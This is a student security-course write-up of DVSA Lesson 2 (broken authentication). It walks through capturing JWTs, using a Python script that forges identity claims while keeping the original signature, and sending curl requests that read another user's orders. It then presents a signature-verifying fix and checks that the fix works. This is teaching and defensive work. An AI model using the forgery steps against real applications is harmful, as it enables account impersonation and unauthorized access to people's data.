# DVSA Lesson 2 — Broken Authentication

## ICS-344 Information Security Project

This repository documents **Lesson 2: Broken Authentication** from the Damn Vulnerable Serverless Application (DVSA) project for the ICS-344 Information Security course at King Fahd University of Petroleum and Minerals (KFUPM).

The purpose of this lesson is to demonstrate how improper JSON Web Token (JWT) handling can allow **JWT forgery** and **identity impersonation**, enabling an attacker to access another user's order data.

---

## Project Information

| Item | Details |
|---|---|
| Course | ICS-344 — Information Security |
| Section | 02 |
| Institution | King Fahd University of Petroleum and Minerals (KFUPM) |
| Lesson | Lesson 2 — Broken Authentication |
| Application | OWASP Damn Vulnerable Serverless Application (DVSA) |
| AWS Region | `us-east-1` — N. Virginia |
| Main Vulnerable Component | `DVSA-ORDER-MANAGER` Lambda Function |
| Main AWS Services | API Gateway, Lambda, DynamoDB, CloudWatch |
| Vulnerability Type | JWT Forgery / Identity Impersonation |
| Report Date | 19 April 2026 |

---

## Team Members

> Add or update team members if needed.

| Name | Student ID |
|---|---|
| Ali Kamal Aloryd | 202322750 |

---

## Vulnerability Summary

The DVSA application contains a **Broken Authentication** vulnerability in the order-processing backend. The backend decodes JWT payloads and trusts identity fields such as `username` and `sub` without verifying the token signature.

Because JWT payloads are Base64URL encoded rather than encrypted, an attacker can decode a valid token, modify identity claims, re-encode the payload, and reuse the token structure. If the backend does not verify the signature, it may accept the modified token and treat the attacker as another user.

This results in **identity impersonation** and unauthorized access to another user's order list or order details.

---

## Root Cause

The vulnerability occurs because the backend authentication logic treats decoded JWT claims as trusted identity data without confirming that the token was genuinely issued by the trusted identity provider.

The insecure behavior includes:

- Decoding the JWT payload without verifying the cryptographic signature
- Trusting attacker-controlled fields such as `username` and `sub`
- Using those unverified fields to authorize access to user order data

The intended authentication boundary should be the verified JWT signature and validated claims, not the decoded payload alone.

---

## Intended Application Workflow

Under normal behavior, the application should follow this workflow:

1. A user logs in to the DVSA frontend.
2. The authentication provider issues a valid JWT.
3. The browser sends the JWT in the `Authorization` header when requesting order data.
4. API Gateway forwards the request to the `DVSA-ORDER-MANAGER` Lambda function.
5. The Lambda function verifies the JWT signature using trusted public keys.
6. The Lambda function validates required claims such as issuer and expiration.
7. The backend extracts the authenticated user identity only after verification succeeds.
8. DynamoDB returns only the orders belonging to the verified user.

The expected security rule is:

> Only a cryptographically verified JWT should determine user identity. User B must never be able to access User C's data by modifying token claims.

---

## Environment and Tools Used

| Tool / Service | Purpose |
|---|---|
| AWS Console | Managing and observing DVSA resources |
| API Gateway | Hosting the `/order` API endpoint |
| AWS Lambda | Running the vulnerable order-management backend |
| DynamoDB | Storing user and order data |
| Browser DevTools | Capturing authorization headers |
| `curl` | Sending API requests |
| `jq` | Formatting JSON responses |
| `python3` | Decoding and modifying JWT payloads |

### API Endpoint Used

```text
https://h3x14rchv6.execute-api.us-east-1.amazonaws.com/dvsa/order
```

> Replace this endpoint with your own API endpoint if reproducing the test in a different DVSA deployment.

---

## Test Accounts

Two users were used to demonstrate the vulnerability:

| User | Role in Test | Purpose |
|---|---|---|
| User B | Attacker | Owns a valid token and attempts impersonation |
| User C | Victim | Owns order data that should not be accessible to User B |

Both users placed at least one order so that normal and exploit behavior could be compared.

---

## Reproduction Steps

> **Important:** These steps are only for the controlled DVSA lab environment. Do not use them against any system that you do not own or have permission to test.

### Step 1 — Capture JWT Tokens

1. Log in to DVSA as **User B**.
2. Open the browser Developer Tools.
3. Go to the **Network** tab.
4. Open the order page or click an order request.
5. Locate the request sent to the `/order` API.
6. Copy the `Authorization` header as `TOKEN_B`.
7. Repeat the same process for **User C** and save the token as `TOKEN_C`.

Example terminal setup:

```bash
export API="https://h3x14rchv6.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN_B="<paste-user-b-token-here>"
export TOKEN_C="<paste-user-c-token-here>"
```

---

### Step 2 — Decode Tokens

Run the following helper script to inspect the identity claims inside each JWT:

```bash
python3 - <<'PY'
import os, json, base64

def decode(token):
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
    data = decode(os.environ[name])
    print("\n" + name)
    print("username:", data.get("username"))
    print("sub:", data.get("sub"))
PY
```

Save the victim identity from User C:

```bash
export VICTIM_USER="<user-c-username-or-sub>"
```

---

### Step 3 — Confirm Normal Behavior

Before forging a token, confirm that User B can only access User B's orders:

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $TOKEN_B" \
--data-raw '{"action":"orders"}' | jq
```

Expected result:

```text
Only User B's orders are returned.
```

This establishes the normal baseline behavior.

---

### Step 4 — Forge the JWT Payload

Create a forged token by starting with User B's token, modifying the payload identity fields, and keeping the original header and signature:

```bash
export FAKE_AS_C="$(
python3 - <<'PY'
import os, json, base64

t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]

h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p.encode()))

# Impersonate the victim
data["username"] = victim
data["sub"] = victim

newp = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()

print(f"{h}.{newp}.{s}")
PY
)"
```

---

### Step 5 — Use the Forged Token

Send an order-list request using the forged token:

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $FAKE_AS_C" \
--data-raw '{"action":"orders"}' | jq
```

Expected vulnerable behavior:

```text
The response contains User C's order data or victim-related data instead of only User B's data.
```

This confirms that the backend trusted modified JWT claims without verifying the token signature.

---

## Evidence Summary

The vulnerability was confirmed by comparing normal and forged-token behavior.

| Evidence | Description |
|---|---|
| Authorization Header Screenshot | Shows the JWT captured from DevTools |
| User B Orders Screenshot | Shows normal behavior using User B's valid token |
| Forged Token Response Screenshot | Shows the backend accepted modified identity claims |
| JSON Output Screenshot | Shows victim-related order data returned from the API |

The key proof is that the attacker modified only the JWT payload, yet the backend accepted the request and returned data that should belong to another user.

---

## Security Impact

This vulnerability is serious because it breaks the trust boundary of authentication.

Possible impacts include:

- User impersonation
- Unauthorized access to another user's order data
- Exposure of sensitive account or order information
- Broken authorization across downstream Lambda and DynamoDB operations
- Loss of integrity in user identity checks

In a serverless application, once the backend trusts the wrong identity, every downstream service may process the attacker's request as if it came from the victim.

---

## Fix Strategy

The correct mitigation is to verify JWTs before trusting any identity claims.

The backend should:

- Extract the JWT from the `Authorization` header safely
- Fetch trusted public keys from the Cognito JWKS endpoint
- Verify the JWT signature cryptographically
- Validate important claims such as `iss`, `exp`, and token use
- Reject missing, expired, malformed, or tampered tokens
- Use `username`, `sub`, or `cognito:username` only after verification succeeds

---

## Code Change

### Vulnerable Pattern

```javascript
var auth_header = headers.Authorization || headers.authorization;
var token_sections = auth_header.split('.');
var auth_data = jose.util.base64url.decode(token_sections[1]);
var token = JSON.parse(auth_data);
var user = token.username;
var isAdmin = false;
```

The issue is that this code only decodes the token payload. It does not verify the token signature.

---

### Secure Pattern

```javascript
var auth_header = (headers.Authorization || headers.authorization || "");
var jwt = auth_header.replace(/^Bearer\s+/i, "").trim();

if (!jwt) {
  return callback(null, resp(401, {
    status: "err",
    msg: "missing authorization"
  }));
}

verifyCognitoJwt(jwt).then((claims) => {
  var user = claims.username || claims["cognito:username"] || claims.sub;

  if (!user) {
    return callback(null, resp(401, {
      status: "err",
      msg: "missing subject"
    }));
  }

  var isAdmin = false;

  // Continue normal order-processing logic only after verification succeeds.
}).catch((e) => {
  console.log("JWT verify failed:", e);
  return callback(null, resp(401, {
    status: "err",
    msg: "invalid token"
  }));
});
```

This fix ensures that identity claims are trusted only after cryptographic verification succeeds.

---

## Verification After Fix

After applying the fix, repeat the forged-token request:

```bash
curl -s "$API" \
-H "content-type: application/json" \
-H "authorization: $FAKE_AS_C" \
--data-raw '{"action":"orders"}' | jq
```

Expected secure behavior:

```json
{
  "status": "err",
  "msg": "invalid token"
}
```

Verification checklist:

| Check | Expected Result |
|---|---|
| Forged token request | Rejected by backend |
| Victim data exposure | No victim data returned |
| Valid User B token | Still returns only User B's orders |
| Valid User C token | Still returns only User C's orders |
| CloudWatch logs | Shows failed JWT verification for forged token |

This confirms that JWT signature verification prevents token tampering while preserving legitimate user access.

---

## Structured Security Analysis

### Table A — Intended Rule and Evidence

| Vulnerability | Intended Rule(s) | Artifacts Used | Normal Behavior Evidence | Exploit Behavior Evidence |
|---|---|---|---|---|
| Broken Authentication | Only verified JWTs should determine user identity; User B must not access User C's data | DevTools authorization header, decoded JWT, curl requests, API responses | Using `TOKEN_B` returns only User B's orders | Modified JWT `FAKE_AS_C` allowed access to victim data or caused abnormal backend behavior |

### Table B — Deviation and Fix

| Vulnerability | Why This Is a Deviation | Deviation Class | Fix Applied | Post-Fix Verification | Optional Latency Before / After |
|---|---|---|---|---|---|
| Broken Authentication | The backend trusted identity claims from an unverified JWT, allowing an attacker to impersonate another user | Intentional misuse / security-relevant abuse | Added JWT signature verification using JWKS in `DVSA-ORDER-MANAGER / order-manager.js` | Forged token is rejected with `invalid token`; valid tokens still work normally | ~120 ms / ~130 ms |

---

## Lessons Learned

This lesson shows that JWTs must never be trusted by simply decoding their payload. JWT payloads are not encrypted, so any user can read and modify them.

The main takeaway is that authentication must rely on cryptographic verification. The backend must verify the JWT signature and validate critical claims before using identity fields for authorization. In serverless architectures, this is especially important because a single weak authentication check can affect every downstream Lambda function and database operation.

---

## Safety and Usage Notice

DVSA is intentionally vulnerable and must only be deployed in a controlled, non-production AWS account for educational purposes.

This repository and its contents are intended only for the ICS-344 Information Security course project. The techniques shown here must not be used maliciously or against systems without explicit authorization.

---

## Repository Structure Suggestion

```text
.
├── README.md
├── report/
│   └── Lesson-2-Broken-Authentication.pdf
├── screenshots/
│   ├── figure-1-authorization-header.png
│   ├── figure-2-user-b-orders.png
│   ├── figure-3-forged-token-response.png
│   └── figure-4-json-victim-data.png
└── fixes/
    └── order-manager-jwt-verification.js
```

---

## Status

| Item | Status |
|---|---|
| Vulnerability demonstrated | Completed |
| Tokens captured and analyzed | Completed |
| Normal behavior verified | Completed |
| Forged token test performed | Completed |
| Evidence collected | Completed |
| Root cause explained | Completed |
| Fix strategy written | Completed |
| Secure code pattern included | Completed |
| Post-fix verification described | Completed |
